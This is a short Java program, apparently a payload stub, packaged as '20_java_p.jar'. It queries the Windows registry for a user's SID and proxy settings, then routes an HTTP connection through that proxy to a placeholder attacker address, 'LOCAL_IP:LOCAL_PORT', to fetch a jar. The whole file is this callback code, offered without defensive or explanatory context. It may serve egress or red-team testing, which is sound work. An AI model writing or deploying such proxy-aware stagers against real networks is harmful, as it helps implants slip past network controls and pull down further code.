// Compile instructions
// javac --release 8 java_p.java && jar -cvmf java_p.mf 20_java_p.jar java_p.class

import java.net.*;
import java.io.*;
import java.util.*;
import java.util.stream.Stream;
import java.lang.reflect.Method;

public class java_p {
	
  public static void main(String[] args) throws Exception {
        String[] myproxy = null;
        try {
            // Run reg query, then read output with StreamReader (internal class)
            Process process = Runtime.getRuntime().exec("reg query HKEY_USERS");

			BufferedReader stdInput = new BufferedReader(new 
				 InputStreamReader(process.getInputStream()));

			BufferedReader stdError = new BufferedReader(new 
				 InputStreamReader(process.getErrorStream()));

			// Read the output from the command
			//System.out.println("Here is the standard output of the command:\n");
			String s = null;
			String sid  = null;
			while ((s = stdInput.readLine()) != null) {
				if( s.contains("S-1-5-21")){
					System.out.println("Value: "+ s);
					sid = s;
					break;
				}
			}
			// Read any errors from the attempted command
			//System.out.println("Here is the standard error of the command (if any):\n");
			//while ((s = stdError.readLine()) != null) {
			//	System.out.println(s);
			//}

            // Run reg query, then read output with StreamReader (internal class)
            Process process2 = Runtime.getRuntime().exec("reg query " + sid + "\"\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer");

			BufferedReader stdInput2 = new BufferedReader(new 
				 InputStreamReader(process2.getInputStream()));

			BufferedReader stdError2 = new BufferedReader(new 
				 InputStreamReader(process2.getErrorStream()));

			// Read the output from the command
			//System.out.println("Here is the standard output of the command:\n");
			String s2 = null;
			while ((s2 = stdInput2.readLine()) != null) {
				if( s2.contains("ProxyServer")){
					String[] parsed = s2.split("    ");
					myproxy = parsed[3].split(":");
					System.out.println("Host: "+ myproxy[0]);
					System.out.println("Port: "+ myproxy[1]);
				}
			}
			// Read any errors from the attempted command
			//System.out.println("Here is the standard error of the command (if any):\n");
			//while ((s = stdError2.readLine()) != null) {
			//	System.out.println(s);
			//}
        }
        catch (Exception e) {
        }
	
	//Proxy instance, proxy ip = 10.0.0.1 with port 8080
	Proxy proxy_connection = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(myproxy[0], Integer.parseInt(myproxy[1])));
	URL myurl = new URL("http://LOCAL_IP:LOCAL_PORT/HTTP_20_java_p.jar");
	URLConnection conn = myurl.openConnection(proxy_connection);
    }
  }
